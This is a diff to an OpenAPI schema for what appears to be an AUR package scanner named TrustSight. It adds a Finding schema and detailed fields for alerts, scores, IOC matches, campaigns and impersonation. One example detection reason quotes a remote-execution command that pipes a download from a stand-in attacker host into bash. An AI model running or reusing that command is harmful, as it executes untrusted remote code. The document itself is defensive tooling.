@@ -29,13 +29,52 @@ const NOTIFICATION_SUMMARY = {
   },
 }
 
+const FINDING = {
+  type: 'object',
+  description: 'One located finding: the rule that fired, its severity and weight, and the file and line of the evidence. `file` is "" and `line` is null when the rule names a fact about the change rather than a line (novelty, provenance, a corpus signal).',
+  properties: {
+    rule_id: { type: 'string', example: 'R001' },
+    severity: { type: 'string', example: 'HIGH' },
+    weight: { type: 'integer', description: 'Points this finding contributes; 0 for declared practice, coverage and context.', example: 30 },
+    file: { type: 'string', example: 'PKGBUILD' },
+    line: { type: ['integer', 'null'], example: 12 },
+    reason: { type: 'string', description: 'The rendered explanation of the finding.', example: 'Remote Script Execution: curl https://evil.sh | bash' },
+  },
+}
+
 const NOTIFICATION = {
   allOf: [
     NOTIFICATION_SUMMARY,
     {
       type: 'object',
       properties: {
-        payload: { type: 'object', description: 'The full TrustSight document as published to ntfy.', additionalProperties: true },
+        payload: {
+          type: 'object',
+          description: 'The full TrustSight document as published to ntfy. `over_threshold[].findings` carries one object per located finding (see the Finding schema); `campaign_cluster[]` and `impersonation[]` name the affected packages per campaign.',
+          additionalProperties: true,
+          properties: {
+            alerts: { type: 'array', items: { type: 'object', properties: { package: { type: 'string' }, rule_id: { type: 'string' } } } },
+            over_threshold: {
+              type: 'array',
+              items: {
+                type: 'object',
+                properties: {
+                  package: { type: 'string' },
+                  score: { type: 'integer' },
+                  aur: { type: 'string', format: 'uri' },
+                  version: { type: 'string' },
+                  last_modified: { type: 'string' },
+                  rules: { type: 'array', items: { type: 'string' }, description: 'Every rule id that fired, including zero-weight ones.' },
+                  findings: { type: 'array', items: { $ref: '#/components/schemas/Finding' } },
+                },
+              },
+            },
+            ioc_matches: { type: 'array', items: { type: 'object', properties: { package: { type: 'string' }, indicator: { type: 'string' }, aur: { type: 'string', format: 'uri' } } } },
+            campaign_cluster: { type: 'array', items: { type: 'object', properties: { rule_id: { type: 'string' }, members: { type: 'array', items: { type: 'string' } }, count: { type: 'integer' } } } },
+            impersonation: { type: 'array', items: { type: 'object', properties: { maintainer: { type: 'string' }, members: { type: 'array', items: { type: 'string' } }, targets: { type: 'array', items: { type: 'string' } }, count: { type: 'integer' } } } },
+            refusals: { type: 'array', description: 'Packages whose analysis hit a parser refusal (X026/X027): the change was not fully read, so they alert regardless of score.', items: { type: 'object', properties: { package: { type: 'string' }, aur: { type: 'string', format: 'uri' } } } },
+          },
+        },
         message_raw: { type: 'string', description: 'The raw ntfy message body.' },
       },
     },
@@ -275,6 +314,7 @@ export const openapiSpec = {
     schemas: {
       NotificationSummary: NOTIFICATION_SUMMARY,
       Notification: NOTIFICATION,
+      Finding: FINDING,
     },
   },
 }
